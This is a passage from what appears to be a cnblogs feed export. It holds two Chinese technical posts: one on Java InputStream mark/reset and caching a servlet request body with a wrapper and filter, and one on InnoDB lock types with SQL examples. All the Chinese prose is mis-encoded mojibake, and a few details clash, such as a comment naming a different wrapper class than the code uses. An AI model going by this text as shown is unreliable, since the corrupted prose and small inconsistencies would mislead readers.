ä¸ºå®ƒä»¬çš„æ•°æ®æºæ˜¯å†…å­˜ä¸­çš„æ•°ç»„ï¼ˆ<strong>æ•°æ®ä¸ä¼šæ¶ˆå¤±</strong>ï¼‰ï¼Œå¯ä»¥é€šè¿‡ <strong>mark()</strong> å’Œ <strong>reset()&nbsp;</strong>æ–¹æ³•å°†æŒ‡é’ˆ <strong>æ¢å¤</strong> åˆ°æ ‡è®°ä½ç½®ã€‚</p>\n<p>éœ€è¦æ³¨æ„ï¼š</p>\n<ul>\n<li>è°ƒç”¨ <strong>reset()&nbsp;</strong>å‰å¿…é¡»å…ˆè°ƒç”¨ <strong>mark(int readlimit)</strong>ï¼›</li>\n<li>ä¸æ˜¯æ‰€æœ‰æµéƒ½æ”¯æŒ <strong>mark() / reset()</strong>ï¼Œå¯ä»¥é€šè¿‡ <strong>inputStream.markSupported()</strong> æ¥è¿›è¡Œåˆ¤æ–­ã€‚</li>\n</ul>\n<p><strong>ä½¿ç”¨ mark() å’Œ reset() æ–¹æ³•ï¼š</strong></p>\n<pre class=\"language-java highlighter-hljs\"><code>// ä»…é€‚ç”¨äºæ”¯æŒmarkçš„æµ\npublic void processWithMark(InputStream input) throws IOException {\n    if (!input.markSupported()) {\n        throw new IOException(\"Mark not supported\");\n    }\n    \n    // æ ‡è®°å½“å‰ä½ç½®ï¼Œå‚æ•°100è¡¨ç¤ºæœ€å¤šå¯å›é€€100å­—èŠ‚\n    input.mark(100);\n    \n    // ç¬¬ä¸€æ¬¡è¯»å–\n    byte[] firstRead = new byte[50];\n    input.read(firstRead);\n    System.out.println(\"First read: \" + new String(firstRead));\n    \n    // é‡ç½®åˆ°æ ‡è®°ä½ç½®\n    input.reset();\n    \n    // ç¬¬äºŒæ¬¡è¯»å–ï¼ˆç›¸åŒå†…å®¹ï¼‰\n    byte[] secondRead = new byte[50];\n    input.read(secondRead);\n    System.out.println(\"Second read: \" + new String(secondRead));\n}</code></pre>\n<p>ä½¿ç”¨ <strong>åŒ…è£…ç±»</strong> è§£å†³ä¸Šæ–‡æˆ‘ä»¬æåˆ°çš„&nbsp;<strong>HTTPè¯·æ±‚ä½“å¤šæ¬¡è¯»å– </strong>çš„é—®é¢˜ï¼š</p>\n<pre class=\"language-java highlighter-hljs\"><code>public class MyRequestWrapper extends HttpServletRequestWrapper {\n    private final byte[] body; // ç¼“å­˜è¯·æ±‚ä½“çš„å­—èŠ‚æ•°ç»„\n\n    public MyRequestWrapper(HttpServletRequest request) throws IOException {\n        super(request);\n        // å…³é”®æ­¥éª¤ï¼šåœ¨æ„é€ æ—¶ä¸€æ¬¡æ€§è¯»å–å¹¶å­˜å‚¨åŸå§‹è¯·æ±‚æµ\n        body = StreamUtils.copyToByteArray(request.getInputStream());\n    }\n\n    // æä¾›ä¸€ä¸ªä¾¿æ·æ–¹æ³•ï¼Œç”¨äºåœ¨è¿‡æ»¤å™¨ä¸­è·å–è¯·æ±‚ä½“å†…å®¹ï¼ˆä¾‹å¦‚è®°å½•æ—¥å¿—ï¼‰\n    // ä½¿ç”¨æ—¶ï¼Œç›´æ¥è°ƒç”¨ getBodyString() å³å¯\n    public String getBodyString() throws UnsupportedEncodingException {\n        return new String(body, this.getCharacterEncoding());\n    }\n\n    @Override\n    public ServletInputStream getInputStream() throws IOException {\n        // æ¯æ¬¡è°ƒç”¨éƒ½è¿”å›ä¸€ä¸ªåŸºäºç¼“å­˜æ•°æ®çš„æ–°æµ\n        ByteArrayInputStream bais = new ByteArrayInputStream(body);\n        return new ServletInputStream() {\n            @Override\n            public int read() {\n                return bais.read();\n            }\n\n            @Override\n            public boolean isFinished() {\n                return bais.available() == 0;\n            }\n\n            @Override\n            public boolean isReady() {\n                return true;\n            }\n\n            @Override\n            public void setReadListener(ReadListener readListener) {\n                // æ— éœ€å®ç°\n            }\n        };\n    }\n\n    @Override\n    public BufferedReader getReader() throws IOException {\n        return new BufferedReader(new InputStreamReader(this.getInputStream(), this.getCharacterEncoding()));\n    }\n}</code></pre>\n<p>ç„¶ååœ¨ <strong>è¿‡æ»¤å™¨</strong> å¤„åŒ…è£…è¯·æ±‚ï¼š</p>\n<pre class=\"language-java highlighter-hljs\"><code>@Slf4j\n@Configuration\npublic class RequestCachingFilterConfig {\n\n    @Bean\n    public FilterRegistrationBean requestCachingFilter() {\n        FilterRegistrationBean registrationBean = new FilterRegistrationBean();\n\n        // æ ¸å¿ƒï¼šåˆ›å»ºè¿‡æ»¤å™¨ï¼ŒåŒ…è£…è¯·æ±‚ä¸º ContentCachingRequestWrapper\n        registrationBean.setFilter(new OncePerRequestFilter() {\n            @Override\n            protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain)\n                    throws ServletException, IOException {\n                // 1. ä»…åŒ…è£… HTTP è¯·æ±‚ï¼ˆæ’é™¤ WebSocket ç­‰ï¼‰\n                if (request instanceof HttpServletRequest &amp;&amp; !(request instanceof ContentCachingRequestWrapper)) {\n                    log.info(\"==========è¿›å…¥requestCachingFilter========\");\n                    // 2. åŒ…è£…è¯·æ±‚ï¼ˆè‡ªåŠ¨ç¼“å­˜è¯·æ±‚ä½“ï¼‰\n                    MyRequestWrapper wrappedRequest = new MyRequestWrapper(request);\n                    filterChain.doFilter(wrappedRequest, response); // ä¼ é€’åŒ…è£…åçš„è¯·æ±‚\n                } else {\n                    filterChain.doFilter(request, response); // æ— éœ€åŒ…è£…ï¼Œç›´æ¥æ”¾è¡Œ\n                }\n            }\n        });\n\n        // 3. é…ç½®æ‹¦æˆªæ‰€æœ‰è¯·æ±‚ï¼ˆå¯æ ¹æ®éœ€æ±‚è°ƒæ•´ URL æ¨¡å¼ï¼‰\n        registrationBean.addUrlPatterns(\"/*\");\n        registrationBean.setOrder(1); // ä¼˜å…ˆçº§æœ€é«˜ï¼Œç¡®ä¿å…ˆäºå…¶ä»–è¿‡æ»¤å™¨æ‰§è¡Œ\n        registrationBean.setName(\"requestCachingFilter\");\n        return registrationBean;\n    }\n}</code></pre>\n<p><strong>IO æµ</strong>åªèƒ½è¯»å–ä¸€æ¬¡ï¼Œæ˜¯ <strong>ç²¾å¿ƒè®¾è®¡çš„</strong>ï¼Œè´´åˆæ“ä½œç³»ç»Ÿæ–‡ä»¶ / ç½‘ç»œ IO çš„ <strong>\"é¡ºåºæ¶ˆè´¹\"</strong>&nbsp;ç‰¹æ€§ï¼Œä¿æŒå’Œåº•å±‚ç³»ç»Ÿçš„ä¸€è‡´æ€§ã€‚</p>\n<p style=\"text-align: right;\"><span style=\"color: rgba(53, 152, 219, 1);\">å¤–åœ¨å½¢å¼è¶Šç®€å•çš„ä¸œè¥¿ï¼Œæ™ºæ…§å«é‡è¶Šé«˜ï¼Œå› ä¸ºå®ƒå·²ç»ä¸å†ä¾èµ–å½¢å¼ï¼Œå¿…é¡»ä¾é æ™ºæ…§ã€‚-- çƒŸæ²™ä¹æ´²</span></p>\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-20 20:22</span>&nbsp;\n<a href=\"https://www.cnblogs.com/yanshajiuzhou\">çƒŸæ²™ä¹æ´²</a>&nbsp;\né˜…è¯»(<span id=\"post_view_count\">0</span>)&nbsp;\nè¯„è®º(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">æ”¶è—</a>&nbsp;\n<a href=\"\">ä¸¾æŠ¥</a>\n</div>"
    },
    {
      "title": "æŠ€æœ¯é¢ï¼šMySQLç¯‡ï¼ˆInnoDBçš„é”æœºåˆ¶ï¼‰",
      "link": "https://www.cnblogs.com/jimoer/p/19508695",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/jimoer/p/19508695\" id=\"cb_post_title_url\" title=\"å‘å¸ƒäº 2026-01-20 20:20\">\n    <span>æŠ€æœ¯é¢ï¼šMySQLç¯‡ï¼ˆInnoDBçš„é”æœºåˆ¶ï¼‰</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        <img alt=\"æŠ€æœ¯é¢ï¼šMySQLç¯‡ï¼ˆInnoDBçš„é”æœºåˆ¶ï¼‰\" class=\"desc_img\" src=\"https://img2024.cnblogs.com/blog/772743/202601/772743-20260120201934204-2046329064.png\" />\n        å…±äº«é”ã€æ’ä»–é”ã€æ„å‘é”ã€è®°å½•é”ã€é—´éš™é”ã€ä¸´é”®é”ï¼ˆNext Key Lockï¼‰ã€æ’å…¥æ„å‘é”ã€AUTO-INCã€æ‚²è§‚é”ã€ä¹è§‚é”\n    </div>\n<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h2 id=\"mysqlçš„innodbçš„é”æœºåˆ¶\">MySQLçš„InnoDBçš„é”æœºåˆ¶</h2>\n<p>MySQLçš„InnoDBå¼•æ“ä¸‹ï¼Œåœ¨é”çš„çº§åˆ«ä¸Šä¸€èˆ¬åˆ†ä¸ºä¸¤ç§ï¼š<strong>å…±äº«é”ï¼ˆSé”ï¼‰</strong>ã€<strong>æ’ä»–é”ï¼ˆXé”ï¼‰</strong></p>\n<h3 id=\"å…±äº«é”\">å…±äº«é”</h3>\n<p><strong><code>å…±äº«é”åˆç§°ä¸ºè¯»é”</code></strong>ï¼Œ<strong>æ˜¯è¯»å–æ“ä½œæ—¶åˆ›å»ºçš„é”ã€‚å…¶ä»–ç”¨æˆ·å¯ä»¥å¹¶å‘è¯»å–æ•°æ®ï¼Œä½†æ˜¯ä¸€æ—¦æŸè¡Œè¢«åŠ ä¸Šå…±äº«é”ï¼Œå…¶ä»–äº‹åŠ¡ä»å¯ç»§ç»­å¯¹è¯¥è¡ŒåŠ å…±äº«é”ï¼›ä½†ä»»ä½•äº‹åŠ¡è‹¥æƒ³å¯¹è¯¥è¡ŒåŠ æ’ä»–é”ï¼ˆå³æ‰§è¡Œ <code>UPDATE</code>/<code>DELETE</code> ç­‰ï¼‰ï¼Œåˆ™å¿…é¡»ç­‰å¾…æ‰€æœ‰å…±äº«é”é‡Šæ”¾</strong>ã€‚</p>\n<blockquote>\n<p>ä¾‹å¦‚ï¼šäº‹åŠ¡T1å¯¹æ•°æ®Açš„åŠ ä¸Šå…±äº«é”ï¼Œå…¶ä»–äº‹åŠ¡åªèƒ½å¯¹æ•°æ®AåŠ å…±äº«é”ï¼Œä¸èƒ½åŠ æ’ä»–é”ã€‚è€Œå…±äº«é”çš„äº‹åŠ¡åªèƒ½è¯»å–æ•°æ®ï¼Œä¸èƒ½ä¿®æ”¹æ•°æ®ã€‚</p>\n</blockquote>\n<p>å…±äº«é”çš„åŠ é”æ–¹å¼å¦‚ä¸‹ï¼š</p>\n<pre><code class=\"language-sql\">-- MySQL8.0ä¹‹å‰çš„æ¨èå†™æ³•\nSELECT ID,NAME FROM TABLE1 WHERE ID &gt;1 AND ID &lt;10 LOCK IN SHARE MODE;\n\n-- MySQL8.0ä»¥åŠä¹‹åçš„æ¨èå†™æ³•\nSELECT ID,NAME FROM TABLE1 WHERE ID &gt;1 AND ID &lt;10 FOR SHARE;\n</code></pre>\n<p>åœ¨æŸ¥è¯¢è¯­å¥åé¢å¢åŠ <code>LOCK IN SHARE MODE</code>ï¼Œä¼šå¯¹æŸ¥è¯¢èŒƒå›´ä¸­çš„æ¯è¡Œéƒ½åŠ å…±äº«é”ï¼Œè¿™æ ·çš„æ•°æ®è¡Œè¿˜å¯ä»¥è¢«å…¶ä»–äº‹åŠ¡æˆåŠŸç”³è¯·å…±äº«é”ï¼Œä½†æ˜¯ä¸èƒ½è¢«ç”³è¯·æ’ä»–é”ã€‚</p>\n<h3 id=\"æ’ä»–é”\">æ’ä»–é”</h3>\n<p><strong><code>æ’ä»–é”åˆç§°å†™é”</code>ï¼Œè‹¥äº‹åŠ¡T1å¯¹æ•°æ®AåŠ ä¸Šæ’ä»–é”ä¹‹åï¼Œå…¶ä»–äº‹åŠ¡åˆ™ä¸èƒ½å†å¯¹æ•°æ®AåŠ ä»»ä½•ç±»å‹çš„é”ã€‚è€Œä¸”æ’ä»–é”çš„äº‹åŠ¡æ—¢å¯ä»¥è¯»æ•°æ®åˆå¯ä»¥å†™æ•°æ®ã€‚</strong></p>\n<p>æ’ä»–é”çš„åŠ é”æ–¹å¼ï¼š</p>\n<pre><code class=\"language-sql\">SELECT ID,NAME FROM TABLE1 WHERE ID &gt;1 AND ID &lt;10 FOR UPDATE;\n</code></pre>\n<p>åœ¨æŸ¥è¯¢è¯­å¥åé¢å¢åŠ <code>FOR UPDATE</code>ï¼Œä¼šå¯¹æŸ¥è¯¢å‘½ä¸­çš„æ¯æ¡è®°å½•éƒ½åŠ æ’ä»–é”ï¼Œå½“æ²¡æœ‰å…¶ä»–çº¿ç¨‹å¯¹æŸ¥è¯¢ç»“æœé›†ä¸­çš„ä»»ä½•ä¸€è¡Œä½¿ç”¨æ’ä»–é”æ—¶ï¼Œå¯ä»¥æˆåŠŸç”³è¯·æ’ä»–é”ï¼Œå¦åˆ™ä¼šè¢«é˜»å¡ã€‚</p>\n<h3 id=\"å…±äº«é”å’Œæ’ä»–é”çš„æ€»ç»“\">å…±äº«é”å’Œæ’ä»–é”çš„æ€»ç»“</h3>\n<ul>\n<li>å½“ä¸€è¡Œæ•°æ®è·å–äº†æ’ä»–é”ï¼Œé‚£ä¹ˆå…¶ä»–äº‹åŠ¡å°±ä¸èƒ½å†å¯¹è¿™ä¸€è¡Œæ•°æ®æ·»åŠ <strong>å…±äº«é”</strong>æˆ–è€…<strong>æ’ä»–é”</strong>ã€‚</li>\n<li>å½“ä¸€è¡Œæ•°æ®è·å–äº†å…±äº«é”ï¼Œé‚£ä¹ˆå…¶ä»–äº‹åŠ¡ä¾ç„¶å¯ä»¥å¯¹è¿™ä¸€è¡Œæ•°æ®æ·»åŠ <strong>å…±äº«é”</strong>ï¼Œä½†ä¸èƒ½æ·»åŠ <strong>æ’ä»–é”</strong>ã€‚</li>\n</ul>\n<h4 id=\"ä½¿ç”¨åœºæ™¯\">ä½¿ç”¨åœºæ™¯</h4>\n<p>å…±äº«é”</p>\n<ul>\n<li><strong>è¯»-è¯»å¹¶å‘é«˜ä¸”ä¸å…è®¸â€œè„è¯»â€ï¼šä¾‹å¦‚æŠ¥è¡¨ç»Ÿè®¡æ—¶ï¼Œå¸Œæœ›åˆ«çš„äº‹åŠ¡å¯ä»¥å¹¶å‘è¯»ï¼Œä½†ç¦æ­¢ä»»ä½•äº‹åŠ¡ä¿®æ”¹è¿™äº›è¡Œã€‚</strong></li>\n<li><strong>çˆ¶å­è¡¨ä¸€è‡´æ€§æ ¡éªŒï¼šå…ˆå¯¹çˆ¶è¡¨ä¸»é”® FOR SHAREï¼Œå†è¯»å­è¡¨ï¼Œé˜²æ­¢çˆ¶è®°å½•åœ¨æ­¤æœŸé—´è¢«åˆ ã€‚</strong></li>\n</ul>\n<p>æ’ä»–é”</p>\n<ul>\n<li>è¯»-æ”¹-å†™ï¼ˆRead-Modify-Writeï¼‰ï¼š</li>\n</ul>\n<pre><code class=\"language-sql\">SELECT balance FROM account WHERE id = 1 FOR UPDATE;\nUPDATE account SET balance = balance - 100 WHERE id = 1;\n</code></pre>\n<p>é˜²æ­¢å¹¶å‘æ‰£æ¬¾å‡ºç°è´Ÿä½™é¢ã€‚</p>\n<ul>\n<li>æ‚²è§‚é”å®ç°â€œç§’æ€åº“å­˜â€ï¼šå…ˆ FOR UPDATE æ£€æŸ¥åº“å­˜ &gt; 0ï¼Œå† UPDATE å‡åº“å­˜ã€‚</li>\n</ul>\n<pre><code class=\"language-sql\">-- åŠ æ’ä»–é”å¹¶è¯»å–å½“å‰åº“å­˜\nSELECT stock FROM merchandise WHERE id = 123 FOR UPDATE;\n\n-- åœ¨åº”ç”¨å±‚åˆ¤æ–­è¿”å›çš„ stock å€¼,è‹¥ stock &gt; 0ï¼Œåˆ™ç»§ç»­ï¼›å¦åˆ™å›æ»šå¹¶è¿”å›â€œå·²å”®ç½„â€\n-- çœŸæ­£æ‰£åº“å­˜ï¼ˆMySQL 8 æ”¯æŒåŸå­å†™æ³•ï¼Œä¹Ÿå¯æ‹†ä¸¤æ­¥ï¼‰\nUPDATE merchandise SET stock = stock - 1 WHERE id = 123 AND stock &gt; 0;\n</code></pre>\n<h3 id=\"æ„å‘é”\">æ„å‘é”</h3>\n<p><strong>é™¤äº†Sé”ï¼ˆå…±äº«é”ï¼‰å’ŒXé”ï¼ˆæ’ä»–é”ï¼‰ä¹‹å¤–ï¼ŒInnoDBè¿˜æœ‰ä¸¤ç§é”ï¼Œå°±æ˜¯ISé”å’ŒIXé”ï¼ŒSå’ŒXå‰é¢çš„Iæ˜¯<code>Intention</code>çš„æ„æ€ï¼Œå³æ„å‘é”ï¼ŒISå°±æ˜¯æ„å‘å…±äº«é”ï¼ŒIXå°±æ˜¯æ„å‘æ’ä»–é”ã€‚</strong></p>\n<p>åœ¨MySQLçš„InnoDBå¼•æ“ä¸­ï¼Œæ ¹æ®é”çš„ä¸åŒèŒƒå›´ä¹Ÿæ˜¯æœ‰åŒºåˆ†çš„ï¼Œä¾‹å¦‚ï¼šè¡¨çº§é”ã€é—´éš™é”ã€è¡Œçº§é”ç­‰ã€‚å½“å¤šä¸ªäº‹åŠ¡åŒæ—¶è®¿é—®åŒä¸€ä¸ªæ•°æ®æ—¶ï¼Œå¤šä¸ªäº‹åŠ¡åŒæ—¶ç”³è¯·è·å–é”ï¼Œé‚£ä¹ˆå°±æœ‰å¯èƒ½å¯¼è‡´äº’ç›¸é˜»å¡ç”šè‡³äº§ç”Ÿæ­»é”ã€‚</p>\n<p>ä¾‹å¦‚ï¼š</p>\n<blockquote>\n<p>äº‹åŠ¡T1å¯¹è¡¨Table1ä¸­çš„ä¸€è¡ŒåŠ ä¸Šäº†è¡Œçº§é”ï¼Œæ­¤æ—¶è¿™è¡Œè®°å½•å°±ä¸èƒ½è¢«å…¶ä»–äº‹åŠ¡å†™äº†ã€‚<br />\näº‹åŠ¡T2ç”³è¯·å¯¹Table1å¢åŠ äº†è¡¨çº§é”ï¼Œè‹¥ç”³è¯·æˆåŠŸäº†ï¼Œé‚£ä¹ˆå°±å¯ä»¥ä¿®æ”¹è¡¨ä¸­çš„ä»»æ„ä¸€è¡Œè®°å½•ã€‚<br />\nè¿™å°±è·Ÿäº‹åŠ¡T1å‘ç”Ÿäº†å†²çªã€‚<br />\né‚£ä¹ˆï¼Œæƒ³è¦è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå°±éœ€è¦è®©äº‹åŠ¡T2åœ¨å¯¹Table1å¢åŠ è¡¨çº§é”çš„æ—¶å€™ï¼Œå…ˆåˆ¤æ–­ä¸€ä¸‹æ˜¯ä¸æ˜¯æœ‰äº‹åŠ¡å¢åŠ è¿‡è¡Œçº§é”ã€‚ä½†æ˜¯ï¼Œäº‹åŠ¡T2æ€»ä¸èƒ½é€æ¡åˆ¤æ–­æ˜¯å¦æœ‰åŠ é”å§?</p>\n</blockquote>\n<p><img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/772743/202601/772743-20260120200421506-515857039.png\" /></p>\n<p>å› æ­¤ï¼Œä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼ŒMySQLå¼•å…¥äº†æ„å‘é”æœºåˆ¶ï¼Œ<strong><code>æ„å‘é”æ˜¯æ•°æ®åº“ç®¡ç†ç³»ç»Ÿä¸­ç”¨äºå®ç°é”åè®®çš„ä¸€ç§é”æœºåˆ¶ï¼Œä¸»è¦æ˜¯ç”¨æ¥å¤„ç†ä¸åŒç²’åº¦é”ï¼ˆå¦‚è¡Œé”å’Œè¡¨é”ï¼‰ä¹‹é—´çš„å¹¶å‘æ€§é—®é¢˜ï¼ˆè€ŒåŒç²’åº¦çš„é”ä¹‹é—´ä¸€èˆ¬æ˜¯é€šè¿‡äº’æ–¥æ¥è§£å†³å¹¶å‘çš„ï¼‰</code></strong>ã€‚</p>\n<blockquote>\n<ul>\n<li>æ„å‘é”ä¸åšé”å®šèµ„æºçš„æ“ä½œï¼Œä¸»è¦æ˜¯é€šçŸ¥çš„ä½œç”¨ï¼Œé˜²æ­¢åœ¨å·²ç»åŠ é”çš„æ•°æ®ä¸Šè®¾ç½®ä¸å…¼å®¹çš„é”ã€‚</li>\n<li>æ„å‘é”ä¸æ˜¯ç›´æ¥ç”±ç”¨æˆ·è¯·æ±‚çš„ï¼Œè€Œæ˜¯MySQLç®¡ç†çš„ã€‚</li>\n</ul>\n</blockquote>\n<p>å½“ä¸€ä¸ªäº‹åŠ¡æƒ³è·å–ä¸€ä¸ªè¡Œçº§é”æˆ–è¡¨çº§é”æ—¶ï¼ŒMySQLä¼šè‡ªåŠ¨è·å–ç›¸åº”çš„è¡¨çš„æ„å‘é”ã€‚è¿™æ—¶ï¼Œå…¶ä»–äº‹åŠ¡å†è¯·æ±‚è·å–è¡¨é”æ—¶ï¼Œå°±å¯ä»¥å…ˆåŸºäºè¿™ä¸ªæ„å‘é”æ¥å‘ç°æ˜¯å¦å·²ç»åŠ è¿‡é”å¹¶ä¸”æœªé‡Šæ”¾ï¼Œå¹¶æ ¹æ®è¯¥é”çš„ç±»å‹(æ„å‘å…±äº«é”/æ„å‘æ’ä»–é”)æ¥åˆ¤æ–­è‡ªå·±æ˜¯å¦å¯ä»¥è·å–é”ã€‚è¿™æ ·å¯ä»¥åœ¨ä¸é˜»å¡å…¶ä»–äº‹åŠ¡çš„æƒ…å†µä¸‹ï¼Œä¸ºå½“å‰äº‹åŠ¡é”å®šèµ„æºã€‚</p>\n<h4 id=\"ä¸¾ä¸ª\">ä¸¾ä¸ªğŸŒ°ï¼š</h4>\n<p><img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/772743/202601/772743-20260120200556283-98907230.png\" /></p>\n<p>1ã€äº‹åŠ¡ T1 æ‰§è¡Œ</p>\n<pre><code class=\"language-sql\">SELECT * FROM table1 WHERE id=1 FOR UPDATE;\n</code></pre>\n<p>InnoDB å…ˆå¯¹è¡¨ table1 åŠ  IXï¼Œå†å¯¹ id=1 çš„è¡ŒåŠ  X é”ã€‚</p>\n<p>2ã€æ­¤æ—¶äº‹åŠ¡ T2 æƒ³ ç”³è¯·è¡¨é”</p>\n<pre><code class=\"language-sql\">LOCK TABLES table1 WRITE;\n</code></pre>\n<p>éœ€ç­‰å¾…ï¼Œå› ä¸ºæ£€æµ‹åˆ°è¡¨ table1 ä¸Šå·²æœ‰ IXï¼ŒçŸ¥é“â€œ<strong><code>table1</code>é‡Œé¢æŸè¡Œæ­£è¢«æ’ä»–é”ä½</strong>â€ï¼Œäºæ˜¯é˜»å¡ã€‚<br />\n3ã€äº‹åŠ¡T1æäº¤æˆåŠŸï¼Œé‡Šæ”¾table1çš„IXé”ï¼Œè¿™ä¸ªæ—¶å€™T2è¢«å”¤é†’æˆåŠŸè·å–<code>table1</code>çš„IXé”ã€‚</p>\n<p>ä»è¿™ä¸ªä¾‹å­ä¸­å¯ä»¥çœ‹å‡ºæ¥ï¼Œ<strong>æ„å‘é”æ˜¯ä¸ªè¡¨çº§é”ï¼Œå¹¶ä¸”ä¼šåœ¨è§¦å‘æ„å‘é”çš„äº‹åŠ¡æäº¤æˆ–å›æ»šåé‡Šæ”¾ã€‚</strong></p>\n<h4 id=\"æ„å‘é”æœ‰ä¸¤ç§æ„å‘å…±äº«é”æ„å‘æ’ä»–é”\">æ„å‘é”æœ‰ä¸¤ç§ï¼š<strong>æ„å‘å…±äº«é”</strong>ã€<strong>æ„å‘æ’ä»–é”</strong></h4>\n<ul>\n<li>\n<p><strong>æ„å‘å…±äº«é”ï¼ˆISï¼‰</strong>:è¡¨ç¤ºäº‹åŠ¡æ‰“ç®—åœ¨èµ„æºä¸Šè®¾ç½®å…±äº«é”(è¯»é”)ã€‚è¿™é€šå¸¸ç”¨äºè¡¨ç¤ºäº‹åŠ¡è®¡åˆ’è¯»å–èµ„æºï¼Œå¹¶ä¸å¸Œæœ›åœ¨è¯»å–æ—¶æœ‰å…¶ä»–äº‹åŠ¡è®¾ç½®æ’å®ƒé”ã€‚</p>\n</li>\n<li>\n<p><strong>æ„å‘æ’å®ƒé”ï¼ˆIXï¼‰</strong>:è¡¨ç¤ºäº‹åŠ¡æ‰“ç®—åœ¨èµ„æºä¸Šè®¾ç½®æ’å®ƒé”(å†™é”)ã€‚è¿™è¡¨ç¤ºäº‹åŠ¡è®¡åˆ’ä¿®æ”¹èµ„æºï¼Œå¹¶ä¸å¸Œæœ›æœ‰å…¶ä»–äº‹åŠ¡åŒæ—¶è®¾ç½®å…±äº«æˆ–æ’å®ƒé”ã€‚</p>\n</li>\n</ul>\n<p>è¿™ä¸¤ç§æ„å‘é”çš„å…¼å®¹æƒ…å†µå¦‚ä¸‹ï¼š</p>\n<table>\n<thead>\n<tr>\n<th>å·²æŒæœ‰ \\ è¯·æ±‚</th>\n<th>ISï¼ˆæ„å‘å…±äº«é”ï¼‰</th>\n<th>IXï¼ˆæ„å‘æ’ä»–é”ï¼‰</th>\n<th>Sï¼ˆè¡¨çº§å…±äº«ï¼‰</th>\n<th>Xï¼ˆè¡¨çº§æ’ä»–ï¼‰</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>ISï¼ˆæ„å‘å…±äº«é”)</strong></td>\n<td>å…¼å®¹</td>\n<td>å…¼å®¹</td>\n<td>å…¼å®¹</td>\n<td>å†²çª</td>\n</tr>\n<tr>\n<td><strong>IXï¼ˆæ„å‘æ’ä»–é”ï¼‰</strong></td>\n<td>å…¼å®¹</td>\n<td>å…¼å®¹</td>\n<td>å…¼å®¹</td>\n<td>å†²çª</td>\n</tr>\n<tr>\n<td><strong>Sï¼ˆè¡¨çº§å…±äº«ï¼‰</strong></td>\n<td>å…¼å®¹</td>\n<td>å†²çª</td>\n<td>å…¼å®¹</td>\n<td>å†²çª</td>\n</tr>\n<tr>\n<td><strong>Xï¼ˆè¡¨çº§æ’ä»–ï¼‰</strong></td>\n<td>å†²çª</td>\n<td>å†²çª</td>\n<td>å†²çª</td>\n<td>å†²çª</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"è®°å½•é”record-lock\">è®°å½•é”ï¼ˆRecord Lockï¼‰</h3>\n<p>Record Lock è§£é‡Šä¸ºè®°å½•é”ï¼Œæ˜¯å› ä¸ºå®ƒåªå¯¹ç´¢å¼•è®°å½•åŠ é”ã€‚<br />\nä¾‹å¦‚ï¼š</p>\n<pre><code class=\"language-sql\">SELECT * FROM users WHERE id = 5 FOR UPDATE;\n</code></pre>\n<p>ä¸Šé¢è¿™ä¸ªSQLä¼šå¯¹ id = 5è¿™æ¡è®°å½•åŠ é”ï¼Œä¸»è¦å°±æ˜¯ä¸ºäº†é˜²æ­¢å…¶ä»–äº‹åŠ¡ï¼Œå¯¹id =5è¿™æ¡è®°å½•è¿›è¡Œæ’å…¥ã€æ›´æ–°ã€åˆ é™¤ç­‰æ“ä½œã€‚</p>\n<p>Record Lock è®°å½•é”å¯ä»¥æ˜¯<strong>å…±äº«é”(Sé”)</strong>æˆ–<strong>æ’ä»–é”(Xé”)</strong>ã€‚</p>\n<blockquote>\n<p>æœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒRecord Locké”çš„ä¸æ˜¯è¿™è¡Œè®°å½•ï¼Œè€Œæ˜¯é”ç´¢å¼•è®°å½•ã€‚å¹¶ä¸”Record locké”ä¸”åªé”ç´¢å¼•!<br />\nå¦‚æœæ²¡æœ‰ç´¢å¼•æ€ä¹ˆåŠ?å¯¹äºè¿™ç§æƒ…å†µï¼ŒInnoDBä¼šåˆ›å»ºä¸€ä¸ªéšè—çš„èšç°‡ç´¢å¼•ï¼Œå¹¶ä½¿ç”¨è¿™ä¸ªç´¢å¼•è¿›è¡Œè®°å½•é”å®šã€‚<br />\nå¦‚æœæˆ‘ä»¬åœ¨ä¸€å¼ è¡¨ä¸­æ²¡æœ‰å®šä¹‰ä¸»é”®ï¼Œé‚£ä¹ˆï¼ŒMySQLä¼šé»˜è®¤é€‰æ‹©ä¸€ä¸ªå”¯ä¸€çš„éç©ºç´¢å¼•ä½œä¸ºèšç°‡ç´¢å¼•ã€‚å¦‚æœæ²¡æœ‰é€‚åˆçš„éç©ºå”¯ä¸€ç´¢å¼•ï¼Œåˆ™ä¼šåˆ›å»ºä¸€ä¸ªéšè—çš„ä¸»é”®(row_id)ä½œä¸ºèšç°‡ç´¢å¼•ã€‚</p>\n</blockquote>\n<p><img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/772743/202601/772743-20260120200658726-1914962034.png\" /></p>\n<h3 id=\"gap-locké—´éš™é”\">Gap Lockï¼ˆé—´éš™é”ï¼‰</h3>\n<p><strong>Gap Lockï¼Œé—´éš™é”ï¼Œæ˜¯åœ¨ç´¢å¼•è®°å½•ä¹‹é—´çš„é—´éš™ä¸Šçš„é”ï¼Œæˆ–è€…åœ¨ç¬¬ä¸€ä¸ªç´¢å¼•è®°å½•ä¹‹å‰ã€æœ€åä¸€ä¸ªç´¢å¼•è®°å½•ä¹‹åçš„é—´éš™ä¸ŠåŠ é”ã€‚</strong></p>\n<p><strong>Gap Lock 